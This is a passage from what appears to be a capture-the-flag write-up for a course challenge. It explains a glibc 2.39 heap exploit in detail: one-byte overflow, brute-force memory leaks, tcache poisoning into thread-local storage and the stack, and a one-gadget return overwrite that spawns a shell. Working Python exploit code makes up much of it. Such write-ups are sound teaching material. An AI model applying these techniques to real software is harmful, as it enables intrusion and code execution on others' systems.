a &ldquo;ERROR: not found&rdquo; response. This matching uses <code>getline()</code>, which terminates upon encountering a null byte. We can exploit this by appending a null byte after a string to perform substring matching on the block contents. This allows us to byte-by-byte brute-force the memory content. The main limitation is that we can&rsquo;t brute-force null bytes or newline bytes.</p><p>Thus, our primitives are:</p><ul><li>One-byte overflow into the next block&rsquo;s header.</li><li>Constrained brute-force primitive for reading heap blocks.</li></ul><h2 class="relative group">A bit of context<div id=a-bit-of-context class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#a-bit-of-context aria-label=Anchor>#</a></span></h2><h3 class="relative group">Heap Bins TLDR (Fast, Tcache, Unsorted)<div id=heap-bins-tldr-fast-tcache-unsorted class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#heap-bins-tldr-fast-tcache-unsorted aria-label=Anchor>#</a></span></h3><p>There exist like a thousand different tutorials on heap bins, so here&rsquo;s just the bare minimum required for our exploit:</p><ul><li>When a heap block is freed, it ends up in linked lists called bins for efficient reuse.</li><li>The relevant bins for this exploit are:</li><li><strong>Fastbins</strong>:<ul><li>Single-linked lists for quickly reallocating small chunks.</li><li>Block sizes from 0x20 to 0x80</li></ul></li><li><strong>Tcache bins</strong>:<ul><li>Introduced in glibc 2.27</li><li>Thread-local fastbins (single-linked) with more sizes, up to 0x420</li><li>Maximum 7 blocks per size before moving to fast bins, then to the unsorted bin.</li></ul></li><li><strong>Unsorted bin</strong>:<ul><li>Doubly linked.</li><li>Used for larger blocks or overflow from fast-/tcache bins.</li><li>Contains pointers useful for leaking libc and heap addresses.</li></ul></li></ul><p>Importantly, the sizes of respective blocks are <strong>determined solely</strong> by the size written in their headers. Manipulating these headers allows blocks to overlap, creating powerful read/write primitives. It also determines which bin (size) a block is freed into, and therefore allows us to free blocks with manipulated headers into the unsorted bin, despite the constrained alloc function.</p><h3 class="relative group">Putting Things Together (Literally)<div id=putting-things-together-literally class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#putting-things-together-literally aria-label=Anchor>#</a></span></h3><p>While a one byte overflow to overwrite block sizes is a powerful primitive, it is not enough to reach block sizes that free into the unsorted bin. However, by chaining overflows, we can gradually increase a block&rsquo;s size until it’s large enough for the unsorted bin. Imagine three blocks A, B, and C directly tailing each other on the heap.</p><ul><li>Overflow from A into B, partially overwriting and therefore increasing B&rsquo;s size.</li><li>Use B, which now partly overlaps with C, to freely overwrite the size in its header.</li><li>Set C&rsquo;s size large enough to land it in the unsorted bin upon freeing.</li></ul><h3 class="relative group">Pointer concealing<div id=pointer-concealing class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#pointer-concealing aria-label=Anchor>#</a></span></h3><p>For security purposes, recent libc versions (2.39) introduced pointer concealing for fastbin/tcache-bin pointers using ASLR offsets:</p><pre tabindex=0><code>concealed_ptr = original_ptr ^ (heap_base &gt;&gt; 12)
</code></pre><p>We therefore need a heap leak to correctly conceal/reveal these heap pointers. Conveniently, unsorted bins still contain unconcealed heap pointers we can leak to defeat this security measure.</p><h3 class="relative group">Something with Houses and Spirits<div id=something-with-houses-and-spirits class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#something-with-houses-and-spirits aria-label=Anchor>#</a></span></h3><p>I guess we&rsquo;re fully going heap feng shui here&mldr;</p><p>There are many general heap exploitation methods which, as step by step plans, turn a set of primitives found in a binary into a full-fledged exploit. Because we are nerds, these methods are often named after &ldquo;houses&rdquo;.</p><p>For this exploit, we will use a derivative of the &ldquo;House of Spirits&rdquo; technique. It allows us to achieve arbitrary reads and writes by controlling forward pointers within the tcache bins. Essentially, we free two blocks into the same tcache bin and manipulate the forward pointer of the first one, so that it points to an arbitrary location. If we then realloc these two blocks, the second one is essentially placed wherever we want, which we can use for arbitrary reads and writes.</p><p>With libc version 2.39, this of course gets a little bit more involved, since we have to conceal this pointer as described above. However, with the heap leaks we will acquire, concealing and revealing pointers become straightforward.</p><h3 class="relative group">Last Bit of Trivia: Thread Local Cache<div id=last-bit-of-trivia-thread-local-cache class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#last-bit-of-trivia-thread-local-cache aria-label=Anchor>#</a></span></h3><p>Since glibc 2.34 removed malloc hooks, we need one more side note to archive RCE: The thread local cache.</p><p>The TLC area is a special segment for thread-specific data, and it conveniently relocates with libc. Interestingly, the TLC holds pointers to different segments including the stack, which makes it particularly interesting for leaking the stack base address.</p><h2 class="relative group">The Exploit<div id=the-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-exploit aria-label=Anchor>#</a></span></h2><h3 class="relative group">Quick Plan of Action<div id=quick-plan-of-action class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#quick-plan-of-action aria-label=Anchor>#</a></span></h3><p>We have the theory. Now, the execution:</p><ul><li>Block A: Overflow into headers to create artificially large chunks, free into unsorted bin to leak heap address.</li><li>Block B: Repeat the same steps to also leak libc address.</li><li>Block C: Perform House of Spirits on the thread-local area to leak stack address.</li><li>Block D: Finally, perform House of Spirits again to write a one-gadget onto the stack and hijack execution.</li></ul><p>Here&rsquo;s the initial heap layout:</p><pre tabindex=0><code>A1, A2, AF, AP...     -&gt; Unsorted bin leak of heap
B1, B2, BF, BP...     -&gt; Unsorted bin leak of libc
C1, C2, C3, C4        -&gt; House of Spirits into TLC
D1, D2, D3, D4        -&gt; House of Spirits into Stack
</code></pre><h3 class="relative group">Step-by-step Walktrough<div id=step-by-step-walktrough class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#step-by-step-walktrough aria-label=Anchor>#</a></span></h3><p>Now, let’s dive deeply into the exploit script itself, explaining line-by-line what happens and why:</p><h4 class="relative group">Step 1: Preparing the Heap layout<div id=step-1-preparing-the-heap-layout class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#step-1-preparing-the-heap-layout aria-label=Anchor>#</a></span></h4><p>In order to avoid any malloc alignment issues later, we first create a stable heap layout with all of the blocks that we will use for the exploit.</p><table><thead><tr><th>Block</th><th>Size</th><th>Description</th></tr></thead><tbody><tr><td>A1</td><td>0x20</td><td>used to override size in A2 to 0x41</td></tr><tr><td>A2</td><td>0x20</td><td>used to override size in AF to 0x421</td></tr><tr><td>AF</td><td>0x20</td><td>will be freed into unsorted bin</td></tr><tr><td>AP&mldr;</td><td>0x80 x 8</td><td>padding (repeated 8 times)</td></tr><tr><td>AV</td><td>0x20</td><td>next valid chunk</td></tr><tr><td>B1</td><td>0x20</td><td>used to override size in B2 to 0x41</td></tr><tr><td>B2</td><td>0x20</td><td>used to override size in BF to 0x421</td></tr><tr><td>BF</td><td>0x20</td><td>will be freed into unsorted bin</td></tr><tr><td>BP&mldr;</td><td>0x80 x 8</td><td>padding (repeated 8 times)</td></tr><tr><td>BV</td><td>0x20</td><td>next valid chunk</td></tr><tr><td>C1</td><td>0x20</td><td>used to override size in C2 to 0x31</td></tr><tr><td>C2</td><td>0x20</td><td>used to override next pointer in freed C3</td></tr><tr><td>C3</td><td>0x20</td><td>next pointer eventually points to TLC</td></tr><tr><td>C4</td><td>0x20</td><td>last block in tcache bin</td></tr><tr><td>D1</td><td>0x20</td><td>used to override size in D2 to 0x31</td></tr><tr><td>D2</td><td>0x20</td><td>used to override next pointer in freed D3</td></tr><tr><td>D3</td><td>0x20</td><td>next pointer eventually points to stack</td></tr><tr><td>D4</td><td>0x20</td><td>last block in tcache bin</td></tr></tbody></table><h4 class="relative group">Step 2: Forcing Blocks into the Unsorted Bin<div id=step-2-forcing-blocks-into-the-unsorted-bin class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#step-2-forcing-blocks-into-the-unsorted-bin aria-label=Anchor>#</a></span></h4><p>We start by using our one‐byte overflow primitive to “bump up” our target blocks to be able to free them into the unsorted bin. For both Group A (heap leak) and Group B (libc leak), we first overflow the size field of block *2, then realloc the manipulated chunk, so that the header of blocks *F is overwritten. Freeing them lands both blocks in the unsorted bin, writing both a libc address and an unconcealed heap address onto the heap, which we eventually can brute force.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># first, write heap address to +0x0388</span>
</span></span><span style=display:flex><span>edit(io, A1, A1<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x41</span><span style=color:#e6db74>&#39;</span>)            <span style=color:#75715e># sets A2 size to 0x41    </span>
</span></span><span style=display:flex><span>delete(io, A2)                      <span style=color:#75715e># frees A2+AF into tcache bin 0x40</span>
</span></span><span style=display:flex><span>                                    <span style=color:#75715e># reallocs A2, sets AF size to 0x421</span>
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x40</span>, A2<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x21\x04\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>+</span>AF)   
</span></span><span style=display:flex><span>delete(io, AF)                      <span style=color:#75715e># frees AF + APAPAPAP into unsorted bin</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># then, write libc address to +0x0788</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(io, B1, B1<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x41</span><span style=color:#e6db74>&#39;</span>)            <span style=color:#75715e># sets B2 size to 0x41    </span>
</span></span><span style=display:flex><span>delete(io, B2)                      <span style=color:#75715e># frees B2+BF into tcache bin 0x40</span>
</span></span><span style=display:flex><span>                                    <span style=color:#75715e># reallocs B2, sets BF size to 0x421</span>
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x40</span>, B2<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x21\x04\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>+</span>BF)   
</span></span><span style=display:flex><span>delete(io, BF)                      <span style=color:#75715e># frees BF + BPBPBPBP into unsorted bin</span>
</span></span></code></pre></div><h4 class="relative group">Step 3: Removing NULL Bytes in Headers<div id=step-3-removing-null-bytes-in-headers class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#step-3-removing-null-bytes-in-headers aria-label=Anchor>#</a></span></h4><p>Before we can brute-force the addresses, we must fix up the headers of our *F blocks. The headers currently contain NULL bytes that would prematurely terminate our <code>getline()</code> call. We fix this by using another one-byte overflow (this time with \x31), then free and reallocate to “clean” the header.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>## now, overwrite headers of *F blocks to get rid of any NULL bytes</span>
</span></span><span style=display:flex><span>edit(io, A1, A1<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x31</span><span style=color:#e6db74>&#39;</span>)            <span style=color:#75715e># sets A2 size to 0x31    </span>
</span></span><span style=display:flex><span>delete(io, A2)                      <span style=color:#75715e># frees A2 + header of AF into tcache bin 0x30</span>
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x14</span><span style=color:#f92672>*</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A2&#39;</span>)         <span style=color:#75715e># reallocs A2, removes NULL BYTES before address</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(io, B1, B1<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x31</span><span style=color:#e6db74>&#39;</span>)            <span style=color:#75715e># sets B2 size to 0x31    </span>
</span></span><span style=display:flex><span>delete(io, B2)                      <span style=color:#75715e># frees B2 + header of BF into tcache bin 0x30</span>
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x14</span><span style=color:#f92672>*</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B2&#39;</span>)         <span style=color:#75715e># reallocs B2, removes NULL BYTES before address</span>
</span></span></code></pre></div><h4 class="relative group">Step 4: Brute-Forcing the Leaked Addresses<div id=step-4-brute-forcing-the-leaked-addresses class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#step-4-brute-forcing-the-leaked-addresses aria-label=Anchor>#</a></span></h4><p>Now that our blocks are in the unsorted bin with “clean” headers, we can use our constrained read primitive to brute-force the leaked addresses.</p><p>To perform the brute force, we use the following snippet (thanks ChatGPT, with some tweaks by me for proper endline handling):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>guess_address</span>(r, prefix, current_guess<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>, total_length<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(current_guess) <span style=color:#f92672>&lt;</span> total_length:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>256</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> i <span style=color:#f92672>in</span> [<span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x0a</span>]: <span style=color:#66d9ef>continue</span> 			<span style=color:#75715e># would terminate getline</span>
</span></span><span style=display:flex><span>            candidate <span style=color:#f92672>=</span> prefix <span style=color:#f92672>+</span> current_guess <span style=color:#f92672>+</span> p8(i)
</span></span><span style=display:flex><span>            r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;2&#34;</span>)
</span></span><span style=display:flex><span>            r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;old content&gt; &#34;</span>, candidate <span style=color:#f92672>+</span> ENDL)
</span></span><span style=display:flex><span>            resp <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;new content&gt;&#34;</span> <span style=color:#f92672>in</span> resp:
</span></span><span style=display:flex><span>                r<span style=color:#f92672>.</span>send(candidate)
</span></span><span style=display:flex><span>                current_guess <span style=color:#f92672>+=</span> p8(i)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> current_guess
</span></span></code></pre></div><p>Using the guess_address() function, we first target the leak from Group A. By providing a known prefix (e.g. the content from the reallocated A2), we can recover 6 bytes from the unsorted bin metadata. After padding with two NULL bytes, we obtain the full 8-byte pointer, from which we derive the heap base (by aligning down to the page boundary).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>heap_leak <span style=color:#f92672>=</span> guess_address(io, <span style=color:#ae81ff>0x14</span><span style=color:#f92672>*</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A2&#39;</span>, total_length<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>heap_addr <span style=color:#f92672>=</span> u64(heap_leak<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>heap_base <span style=color:#f92672>=</span> heap_addr <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFFFFFFF000</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;Found heap base: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(hex(heap_base)))
</span></span></code></pre></div><p>The process is repeated for Group B to leak a libc pointer. Once we have the 6-byte leak, we similarly pad and compute the libc base using a known offset.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>libc_leak <span style=color:#f92672>=</span> guess_address(io, <span style=color:#ae81ff>0x14</span><span style=color:#f92672>*</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B2&#39;</span>, total_length<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>libc_addr <span style=color:#f92672>=</span> u64(libc_leak<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> (libc_addr <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFFFFFFF000</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1d8000</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;Found libc base: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(hex(libc_base)))
</span></span></code></pre></div><p>With both the heap and libc bases known, our exploit now has all the necessary information to create our own tcache pointers and perform a House of Spirits attack.</p><h4 class="relative group">Step 5: Leaking the Stack Address via ThreadLocalCache (TLC)<div id=step-5-leaking-the-stack-address-via-threadlocalcache-tlc class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#step-5-leaking-the-stack-address-via-threadlocalcache-tlc aria-label=Anchor>#</a></span></h4><p>Since glibc 2.34 removed malloc hooks, an additional trick is required to archive RCE: leveraging the ThreadLocalCache (TLC). As described above, the TLC is a thread-specific data area that, among other things, stores pointers to various segments—including the stack. By corrupting the tcache metadata (using a House of Spirits technique with Group C), we force the allocator to return a pointer into the TLC, which we then use to leak a stack address.</p><p>Steps for Group C:</p><ul><li><strong>Prepare the Tcache</strong>: Free chunks C4 and C3 so that the tcache becomes available for our manipulation.</li><li><strong>Corrupt the Header and Free C2</strong>: Use an overflow on C1 (with \x31) to modify C2’s header, then free C2 to place it into the tcache.</li><li><strong>Inject a Fake Pointer into TLC</strong>: Reallocate C2 with a payload that appends a concealed pointer (using the PROTECT_PTR helper) that points to the TLC area (and thus the stack).</li><li><strong>Force an Allocation into TLC</strong>: Allocate C3 and then CT. The latter allocation returns a pointer into TLC.</li><li><strong>Use brute force gadget again:</strong> Finally, we brute-force 6 bytes from CT, pad them, and derive the stack base.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>some_stack_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x2240</span>   <span style=color:#75715e># stack address I found in the TLC</span>
</span></span><span style=display:flex><span>pos <span style=color:#f92672>=</span> heap_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xbe0</span>
</span></span><span style=display:flex><span>fake_malloc_tloc <span style=color:#f92672>=</span> PROTECT_PTR(pos, some_stack_addr)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(io, C4)
</span></span><span style=display:flex><span>delete(io, C3)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(io, C1, C1<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x31</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>delete(io, C2)
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x30</span>, C2<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x21\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>+</span>p64(fake_malloc_tloc))
</span></span><span style=display:flex><span>edit(io, C1, C1<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x21</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x20</span>, C3)
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x20</span>, CT)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>stack_leak <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xc0\xe9\xff\xff\xff\x7f</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>stack_leak <span style=color:#f92672>=</span> guess_address(io, CT, total_length<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>stack_addr <span style=color:#f92672>=</span> u64(stack_leak<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>stack_ret <span style=color:#f92672>=</span> stack_addr <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x130</span> <span style=color:#75715e># return alloc is reliably located here</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;Found stack addr (ret of alloc): </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(hex(stack_ret)))
</span></span></code></pre></div><p>With the stack leak obtained, we can now finally redirect control flow.</p><h4 class="relative group">Step 6: Overwriting the Return Address with a One-Gadget<div id=step-6-overwriting-the-return-address-with-a-one-gadget class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#step-6-overwriting-the-return-address-with-a-one-gadget aria-label=Anchor>#</a></span></h4><p>Armed with the leaked addresses, the final phase is to overwrite a return pointer on the stack with a one-gadget from libc. One-gadgets are specific offsets within libc that, when executed, set up the registers and environment for execve("/bin/sh", &mldr;). They can be found with the help of the <code>one_gadget</code> gem, which uses fancy z3 math for constraint solving.</p><p>For our exploit, we choose the one-gadget at offset 0xd63f3. Its constraints are quite managable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>0xd63f3 execve<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span>, rbp-0x40, r12<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>constraints:
</span></span><span style=display:flex><span>  address rbp-0x38 is writable
</span></span><span style=display:flex><span>  rdi <span style=color:#f92672>==</span> NULL <span style=color:#f92672>||</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span>, rdi, NULL<span style=color:#f92672>}</span> is a valid argv
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>r12<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> NULL <span style=color:#f92672>||</span> r12 <span style=color:#f92672>==</span> NULL <span style=color:#f92672>||</span> r12 is a valid envp
</span></span></code></pre></div><p>To place this one-gadget onto the stack, we perform a second House of Spirits attack to overwrite the return pointer of the alloc function. Our stack leak allows us to compute the exact address of this return pointer by subtracting a known offset (0x130). The payload comprises a new base pointer (a safe heap address) and the one-gadget address, calculated as libc_base + 0xd63f3.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>onegadget <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xd63f3</span>
</span></span><span style=display:flex><span>pos <span style=color:#f92672>=</span> heap_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x0c60</span>
</span></span><span style=display:flex><span>fake_malloc_stack <span style=color:#f92672>=</span> PROTECT_PTR(pos, stack_ret)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(io, D4)
</span></span><span style=display:flex><span>delete(io, D3)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(io, D1, D1<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x31</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>delete(io, D2)
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x30</span>, D2<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x21\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>+</span>p64(fake_malloc_stack))
</span></span><span style=display:flex><span>edit(io, D1, D1<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x21</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x20</span>, D3)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PAYLOAD <span style=color:#f92672>=</span>  p64(heap_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x138</span>) <span style=color:#f92672>+</span> p64(onegadget)
</span></span><span style=display:flex><span>alloc(io, <span style=color:#ae81ff>0x20</span>, PAYLOAD)
</span></span></code></pre></div><p>Once this payload is written, when the alloc function returns, control flow is redirected to our one-gadget, spawning a shell.</p><h4 class="relative group">Step 7: Running the Exploit<div id=step-7-running-the-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#step-7-running-the-exploit aria-label=Anchor>#</a></span></h4><p>When run locally, the exploit completes almost immediately. However, running against the server has brute-forcing steps taking about two minutes. Talking about building suspense&mldr;</p><p>Eventually, our exploit fully executes, dropping us directly into a shell with the flag:</p><pre tabindex=0><code>$ cat flag.txt
SoftSec{.............}
</code></pre><p>And voilà—the challenge is complete.</p><h2 class="relative group">Final Thoughts<div id=final-thoughts class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final-thoughts aria-label=Anchor>#</a></span></h2><p>I genuinely enjoyed working through this challenge, and I learned a ton along the way. After three straight days of heap, finally seeing the flag was extremely satisfying - and finally leaving my apartment again also felt amazing :D
